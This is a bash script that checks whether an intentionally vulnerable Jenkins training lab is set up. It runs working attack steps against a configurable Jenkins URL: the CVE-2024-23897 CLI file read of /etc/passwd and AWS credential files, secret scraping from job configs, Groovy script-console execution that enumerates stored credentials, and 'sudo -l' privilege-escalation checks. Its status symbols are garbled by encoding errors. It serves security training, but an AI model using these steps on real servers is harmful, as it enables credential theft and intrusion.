#!/bin/bash

JENKINS_URL="${JENKINS_URL:-http://localhost:8080}"
JENKINS_USER="${JENKINS_USER:-admin}"
JENKINS_PASS="${JENKINS_PASS:-admin}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

PASSED=0
FAILED=0

echo "=========================================="
echo "Jenkins Lab Production Exploit Testing"
echo "=========================================="
echo "Target: $JENKINS_URL"
echo "Credentials: $JENKINS_USER:$JENKINS_PASS"
echo ""

check() {
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[ÃƒÂ¢Ã…â€œÃ¢â‚¬Å“]${NC} $1"
        PASSED=$((PASSED + 1))
    else
        echo -e "${RED}[ÃƒÂ¢Ã…â€œÃ¢â‚¬â€]${NC} $1"
        FAILED=$((FAILED + 1))
    fi
}

warn() {
    echo -e "${YELLOW}[!]${NC} $1"
}

echo "[*] Step 1: Connectivity Check"
echo "---"

if curl -s -o /dev/null -w "%{http_code}" "$JENKINS_URL" | grep -q "200\|403"; then
    check "Jenkins is accessible"
else
    echo -e "${RED}[ÃƒÂ¢Ã…â€œÃ¢â‚¬â€] Jenkins is not accessible${NC}"
    echo "Start Jenkins Lab: docker-compose up -d"
    exit 1
fi

if curl -s -u "$JENKINS_USER:$JENKINS_PASS" "$JENKINS_URL/api/json" | grep -q "mode"; then
    check "Authentication works"
else
    echo -e "${RED}[ÃƒÂ¢Ã…â€œÃ¢â‚¬â€] Authentication failed${NC}"
    exit 1
fi

echo ""
echo "[*] Step 2: Job Validation"
echo "---"

EXPECTED_JOBS=("vulnerable-pipeline" "aws-deployment" "database-migration" "api-deployment" "build-artifacts" "kubernetes-deploy")

for job in "${EXPECTED_JOBS[@]}"; do
    if curl -s -u "$JENKINS_USER:$JENKINS_PASS" "$JENKINS_URL/job/$job/api/json" | grep -q "name"; then
        check "Job exists: $job"
    else
        echo -e "${RED}[ÃƒÂ¢Ã…â€œÃ¢â‚¬â€] Job missing: $job${NC}"
        FAILED=$((FAILED + 1))
    fi
done

echo ""
echo "[*] Step 3: Credentials Check"
echo "---"

CRED_RESPONSE=$(curl -s -u "$JENKINS_USER:$JENKINS_PASS" "$JENKINS_URL/credentials/store/system/domain/_/api/json")

if echo "$CRED_RESPONSE" | grep -q "credentials"; then
    CRED_COUNT=$(echo "$CRED_RESPONSE" | grep -o '"id"' | wc -l)
    if [ "$CRED_COUNT" -ge 16 ]; then
        check "Credentials loaded ($CRED_COUNT total)"
    else
        warn "Credentials loaded but count low ($CRED_COUNT, expected 16)"
    fi
else
    echo -e "${RED}[ÃƒÂ¢Ã…â€œÃ¢â‚¬â€] No credentials found${NC}"
    FAILED=$((FAILED + 1))
fi

echo ""
echo "[*] Step 4: CVE-2024-23897 (CLI File Read)"
echo "---"

CLI_JAR="jenkins-cli.jar"

if [ ! -f "$CLI_JAR" ]; then
    echo "Downloading jenkins-cli.jar..."
    if wget -q "$JENKINS_URL/jnlpJars/jenkins-cli.jar" -O "$CLI_JAR"; then
        check "CLI jar downloaded"
    else
        warn "CLI jar download failed, skipping CLI tests"
        CLI_JAR=""
    fi
else
    check "CLI jar exists"
fi

if [ -n "$CLI_JAR" ] && [ -f "$CLI_JAR" ]; then
    if command -v java &> /dev/null; then
        echo "Testing file read via CLI..."
        
        OUTPUT=$(java -jar "$CLI_JAR" -s "$JENKINS_URL" help "@/etc/passwd" 2>&1)
        
        if echo "$OUTPUT" | grep -qE "root:.*:0:0"; then
            check "CVE-2024-23897: File read successful (/etc/passwd)"
        else
            warn "CVE-2024-23897: File read failed or different output format"
        fi
        
        OUTPUT=$(java -jar "$CLI_JAR" -s "$JENKINS_URL" help "@/home/jenkins/.aws/credentials" 2>&1)
        
        if echo "$OUTPUT" | grep -qE "AKIA|aws_access_key_id"; then
            check "CVE-2024-23897: AWS credentials readable"
        else
            warn "CVE-2024-23897: AWS credentials not found"
        fi
    else
        warn "Java not installed, skipping CLI tests"
    fi
fi

echo ""
echo "[*] Step 5: Script Console Access"
echo "---"

SCRIPT_CONSOLE=$(curl -s -u "$JENKINS_USER:$JENKINS_PASS" "$JENKINS_URL/script")

if echo "$SCRIPT_CONSOLE" | grep -q "Groovy script"; then
    check "Script Console accessible"
else
    echo -e "${RED}[ÃƒÂ¢Ã…â€œÃ¢â‚¬â€] Script Console not accessible${NC}"
    FAILED=$((FAILED + 1))
fi

echo ""
echo "[*] Step 6: Job Configuration Secrets"
echo "---"

CONFIG_XML=$(curl -s -u "$JENKINS_USER:$JENKINS_PASS" "$JENKINS_URL/job/vulnerable-pipeline/config.xml")

if echo "$CONFIG_XML" | grep -q "AWS_ACCESS_KEY_ID"; then
    check "Job 'vulnerable-pipeline' contains AWS secrets"
else
    warn "Job 'vulnerable-pipeline' missing expected secrets"
fi

CONFIG_XML=$(curl -s -u "$JENKINS_USER:$JENKINS_PASS" "$JENKINS_URL/job/database-migration/config.xml")

if echo "$CONFIG_XML" | grep -q "DB_PASSWORD"; then
    check "Job 'database-migration' contains DB secrets"
else
    warn "Job 'database-migration' missing expected secrets"
fi

CONFIG_XML=$(curl -s -u "$JENKINS_USER:$JENKINS_PASS" "$JENKINS_URL/job/api-deployment/config.xml")

if echo "$CONFIG_XML" | grep -q "STRIPE_SECRET_KEY"; then
    check "Job 'api-deployment' contains API keys"
else
    warn "Job 'api-deployment' missing expected secrets"
fi

echo ""
echo "[*] Step 7: Groovy Script Execution Test"
echo "---"

GROOVY_SCRIPT='println "EXPLOIT_TEST_OUTPUT"'
GROOVY_RESULT=$(curl -s -u "$JENKINS_USER:$JENKINS_PASS" \
    --data-urlencode "script=$GROOVY_SCRIPT" \
    "$JENKINS_URL/scriptText")

if echo "$GROOVY_RESULT" | grep -q "EXPLOIT_TEST_OUTPUT"; then
    check "Groovy script execution works"
else
    warn "Groovy script execution failed"
fi

echo ""
echo "[*] Step 8: Credential Extraction via Groovy"
echo "---"

CRED_EXTRACT_SCRIPT='
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.domains.*

def store = SystemCredentialsProvider.getInstance().getStore()
def credentials = store.getCredentials(Domain.global())
println "CREDENTIAL_COUNT:" + credentials.size()
'

CRED_RESULT=$(curl -s -u "$JENKINS_USER:$JENKINS_PASS" \
    --data-urlencode "script=$CRED_EXTRACT_SCRIPT" \
    "$JENKINS_URL/scriptText")

if echo "$CRED_RESULT" | grep -q "CREDENTIAL_COUNT:"; then
    COUNT=$(echo "$CRED_RESULT" | grep -o "CREDENTIAL_COUNT:[0-9]*" | cut -d: -f2)
    if [ "$COUNT" -ge 16 ]; then
        check "Credential extraction works ($COUNT credentials)"
    else
        warn "Credential extraction works but count low ($COUNT)"
    fi
else
    warn "Credential extraction via Groovy failed"
fi

echo ""
echo "[*] Step 9: File-based Secret Extraction via Groovy"
echo "---"

FILE_READ_SCRIPT='
def file = new File("/home/jenkins/.aws/credentials")
if (file.exists()) {
    def content = file.text
    if (content.contains("aws_access_key_id")) {
        println "AWS_CREDENTIALS_FOUND"
    }
}
'

FILE_RESULT=$(curl -s -u "$JENKINS_USER:$JENKINS_PASS" \
    --data-urlencode "script=$FILE_READ_SCRIPT" \
    "$JENKINS_URL/scriptText")

if echo "$FILE_RESULT" | grep -q "AWS_CREDENTIALS_FOUND"; then
    check "File-based secrets readable via Groovy"
else
    warn "File-based secrets not accessible"
fi

echo ""
echo "[*] Step 10: Privilege Escalation Vectors"
echo "---"

SUDO_CHECK_SCRIPT='
def proc = "sudo -l".execute()
proc.waitFor()
def output = proc.text
if (output.contains("NOPASSWD")) {
    println "SUDO_NOPASSWD_FOUND"
}
'

SUDO_RESULT=$(curl -s -u "$JENKINS_USER:$JENKINS_PASS" \
    --data-urlencode "script=$SUDO_CHECK_SCRIPT" \
    "$JENKINS_URL/scriptText")

if echo "$SUDO_RESULT" | grep -q "SUDO_NOPASSWD_FOUND"; then
    check "Sudo NOPASSWD configuration confirmed"
else
    warn "Sudo configuration check failed"
fi

CRON_CHECK_SCRIPT='
def file = new File("/etc/cron.d/jenkins-backup")
if (file.exists()) {
    println "CRONJOB_FOUND"
}
'

CRON_RESULT=$(curl -s -u "$JENKINS_USER:$JENKINS_PASS" \
    --data-urlencode "script=$CRON_CHECK_SCRIPT" \
    "$JENKINS_URL/scriptText")

if echo "$CRON_RESULT" | grep -q "CRONJOB_FOUND"; then
    check "Vulnerable cronjob exists"
else
    warn "Cronjob not found"
fi

echo ""
echo "=========================================="
echo "Results: ${GREEN}$PASSED passed${NC}, ${RED}$FAILED failed${NC}"
echo "=========================================="
echo ""

if [ $FAILED -eq 0 ]; then
    echo -e "${GREEN}[+] All tests passed - Jenkins Lab is production-ready${NC}"
    echo ""
    echo "Next steps:"
    echo "  1. Test JenkinsBreaker: python3 JenkinsBreaker.py --url $JENKINS_URL --auto"
    echo "  2. Test specific CVEs manually"
    echo "  3. Extract all secrets for validation"
    echo ""
    exit 0
else
    echo -e "${YELLOW}[!] Some tests failed - review configuration${NC}"
    echo ""
    echo "Troubleshooting:"
    echo "  - Check Jenkins logs: docker-compose logs jenkins"
    echo "  - Verify init.groovy.d scripts ran: docker-compose logs | grep 'Credentials added'"
    echo "  - Run verification: ./verify_secrets.sh"
    echo ""
    exit 1
fi
